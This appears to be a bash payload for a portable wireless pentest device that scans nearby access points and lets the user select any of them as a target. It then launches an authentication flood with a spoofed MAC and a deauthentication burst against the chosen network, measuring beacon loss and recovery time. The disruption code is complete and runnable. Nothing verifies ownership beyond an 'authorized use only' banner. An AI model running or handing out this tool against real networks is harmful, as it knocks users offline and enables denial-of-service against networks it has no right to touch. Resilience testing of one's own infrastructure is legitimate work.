#!/bin/bash
# Title: WiFi Stress
# Author: bad-antics
# Description: Wireless infrastructure stress testing and resilience analysis
# Category: nullsec/general

LOOT_DIR="/mmc/nullsec/stress"
mkdir -p "$LOOT_DIR"

PROMPT "WIFI STRESS

Test wireless infrastructure
resilience under load.

Tests:
- Auth flood resistance
- Beacon flood tolerance
- Association storm handling
- Channel saturation
- Multi-client simulation
- Recovery time measurement

FOR AUTHORIZED TESTING ONLY.
Tests YOUR OWN infrastructure.

Press OK to configure."

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!\nRun: airmon-ng start wlan1"; exit 1; }

# Scan for target
resp=$(CONFIRMATION_DIALOG "SCAN FOR TARGET?

Press OK to scan for your AP.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Scanning..."
SCAN_FILE="/tmp/stress_scan"
rm -f "${SCAN_FILE}"*.csv 2>/dev/null
timeout 12 airodump-ng "$MONITOR_IF" -w "$SCAN_FILE" --output-format csv 2>/dev/null
SPINNER_STOP

# Build target list
TARGET_LIST=""
TARGET_COUNT=0
while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lan_ip id_len essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^ *//;s/ *$//')
    channel=$(echo "$channel" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    [ -z "$essid" ] && essid="<hidden>"
    TARGET_COUNT=$((TARGET_COUNT + 1))
    TARGET_LIST="${TARGET_LIST}${TARGET_COUNT}) ${essid} [${bssid}] Ch:${channel}\n"
done < "${SCAN_FILE}-01.csv" 2>/dev/null

[ $TARGET_COUNT -eq 0 ] && { ERROR_DIALOG "No targets found!"; exit 1; }

TARGET_NUM=$(NUMBER_PICKER "Target (1-$TARGET_COUNT):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

# Get target details
IDX=0
TARGET_BSSID=""
TARGET_ESSID=""
TARGET_CH=""
while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lan_ip id_len essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^ *//;s/ *$//')
    channel=$(echo "$channel" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    IDX=$((IDX + 1))
    [ $IDX -eq $TARGET_NUM ] && TARGET_BSSID="$bssid" && TARGET_ESSID="$essid" && TARGET_CH="$channel" && break
done < "${SCAN_FILE}-01.csv" 2>/dev/null

[ -z "$TARGET_BSSID" ] && { ERROR_DIALOG "Invalid target!"; exit 1; }

TEST_DURATION=$(NUMBER_PICKER "Test duration (sec):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TEST_DURATION=30 ;; esac

TIMESTAMP=$(date +%Y%m%d_%H%M)
REPORT="$LOOT_DIR/stress_${TIMESTAMP}.txt"

resp=$(CONFIRMATION_DIALOG "START STRESS TEST?

Target: $TARGET_ESSID
BSSID: $TARGET_BSSID
Channel: $TARGET_CH
Duration: ${TEST_DURATION}s per test

THIS WILL DISRUPT THE TARGET
NETWORK. AUTHORIZED USE ONLY.

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Starting stress test..."

echo "================================================================" > "$REPORT"
echo "         NULLSEC WIFI STRESS REPORT                            " >> "$REPORT"
echo "================================================================" >> "$REPORT"
echo "Time: $(date)" >> "$REPORT"
echo "Target: $TARGET_ESSID ($TARGET_BSSID) Ch:$TARGET_CH" >> "$REPORT"
echo "" >> "$REPORT"

iwconfig "$MONITOR_IF" channel "$TARGET_CH" 2>/dev/null

# --- Test 1: Baseline measurement ---
SPINNER_START "Test 1/4: Baseline..."
echo "--- TEST 1: BASELINE ---" >> "$REPORT"

BASELINE_FILE="/tmp/stress_base"
rm -f "${BASELINE_FILE}"*.csv 2>/dev/null
timeout 10 airodump-ng "$MONITOR_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$BASELINE_FILE" --output-format csv 2>/dev/null

BASE_BEACONS=$(grep "$TARGET_BSSID" "${BASELINE_FILE}-01.csv" 2>/dev/null | head -1 | awk -F',' '{print $10}' | tr -d ' ')
BASE_BEACONS=${BASE_BEACONS:-0}
echo "  Baseline beacons (10s): $BASE_BEACONS" >> "$REPORT"
echo "  Beacon rate: ~$((BASE_BEACONS / 10))/sec" >> "$REPORT"
echo "" >> "$REPORT"
SPINNER_STOP

# --- Test 2: Auth flood ---
SPINNER_START "Test 2/4: Auth flood..."
echo "--- TEST 2: AUTH FLOOD RESISTANCE ---" >> "$REPORT"

# Send fake auth requests
timeout $TEST_DURATION aireplay-ng -1 0 -e "$TARGET_ESSID" -a "$TARGET_BSSID" -h "DE:AD:BE:EF:CA:FE" "$MONITOR_IF" > /tmp/auth_flood.txt 2>&1 &
FLOOD_PID=$!

# Monitor AP response during flood
AUTH_FILE="/tmp/stress_auth"
rm -f "${AUTH_FILE}"*.csv 2>/dev/null
timeout $TEST_DURATION airodump-ng "$MONITOR_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$AUTH_FILE" --output-format csv 2>/dev/null

kill $FLOOD_PID 2>/dev/null

AUTH_BEACONS=$(grep "$TARGET_BSSID" "${AUTH_FILE}-01.csv" 2>/dev/null | head -1 | awk -F',' '{print $10}' | tr -d ' ')
AUTH_BEACONS=${AUTH_BEACONS:-0}
AUTH_RATE=$((AUTH_BEACONS / (TEST_DURATION + 1)))
BASE_RATE=$((BASE_BEACONS / 10))

echo "  Beacons during flood: $AUTH_BEACONS (${AUTH_RATE}/sec)" >> "$REPORT"
if [ $BASE_RATE -gt 0 ]; then
    DROP=$((100 - (AUTH_RATE * 100 / BASE_RATE)))
    [ $DROP -lt 0 ] && DROP=0
    echo "  Beacon drop: ${DROP}%" >> "$REPORT"
    if [ $DROP -lt 10 ]; then
        echo "  Result: RESILIENT — minimal impact" >> "$REPORT"
    elif [ $DROP -lt 50 ]; then
        echo "  Result: DEGRADED — noticeable impact" >> "$REPORT"
    else
        echo "  Result: VULNERABLE — severe impact" >> "$REPORT"
    fi
fi
echo "" >> "$REPORT"
SPINNER_STOP

# --- Test 3: Deauth resilience ---
SPINNER_START "Test 3/4: Deauth resilience..."
echo "--- TEST 3: DEAUTH RESILIENCE ---" >> "$REPORT"

DEAUTH_START=$(date +%s)
aireplay-ng -0 5 -a "$TARGET_BSSID" "$MONITOR_IF" > /dev/null 2>&1

# Measure recovery time
RECOVERED=0
for i in $(seq 1 20); do
    sleep 1
    ALIVE=$(timeout 2 airodump-ng "$MONITOR_IF" -c "$TARGET_CH" --bssid "$TARGET_BSSID" --output-format csv -w /tmp/stress_recov 2>/dev/null; grep -c "$TARGET_BSSID" /tmp/stress_recov*.csv 2>/dev/null || echo 0)
    rm -f /tmp/stress_recov*.csv 2>/dev/null
    if [ "$ALIVE" -gt 0 ]; then
        RECOVERED=$i
        break
    fi
done

if [ $RECOVERED -gt 0 ]; then
    echo "  Recovery time: ~${RECOVERED}s after deauth burst" >> "$REPORT"
    echo "  Result: AP recovered in ${RECOVERED} seconds" >> "$REPORT"
else
    echo "  Recovery: AP still beaconing (resilient)" >> "$REPORT"
fi
echo "" >> "$REPORT"
SPINNER_STOP

# --- Test 4: Channel saturation ---
SPINNER_START "Test 4/4: Channel saturation..."
echo "--- TEST 4: CHANNEL SATURATION ---" >> "$REPORT"

SAT_FILE="/tmp/stress_sat"
rm -f "${SAT_FILE}"*.csv 2>/dev/null
timeout $TEST_DURATION airodump-ng "$MONITOR_IF" -c "$TARGET_CH" -w "$SAT_FILE" --output-format csv 2>/dev/null

# Count all APs and clients on same channel
CH_APS=$(grep -cE "^([0-9A-Fa-f]{2}:){5}" "${SAT_FILE}-01.csv" 2>/dev/null || echo 0)
echo "  APs on channel $TARGET_CH: $CH_APS" >> "$REPORT"

if [ $CH_APS -gt 10 ]; then
    echo "  Result: HIGH congestion — channel is saturated" >> "$REPORT"
elif [ $CH_APS -gt 5 ]; then
    echo "  Result: MODERATE congestion" >> "$REPORT"
else
    echo "  Result: LOW congestion — channel is clear" >> "$REPORT"
fi
echo "" >> "$REPORT"
SPINNER_STOP

# Cleanup
killall aireplay-ng airodump-ng 2>/dev/null

echo "--- OVERALL ASSESSMENT ---" >> "$REPORT"
echo "  Target: $TARGET_ESSID ($TARGET_BSSID)" >> "$REPORT"
echo "  Tests completed: 4" >> "$REPORT"
echo "  Recommendation: Review results above" >> "$REPORT"
echo "================================================================" >> "$REPORT"

PROMPT "STRESS TEST COMPLETE

Target: $TARGET_ESSID
Tests: 4/4 completed

Baseline: $BASE_BEACONS beacons/10s
Auth flood impact: measured
Recovery: ${RECOVERED:-0}s
Channel APs: $CH_APS

Report: $REPORT"
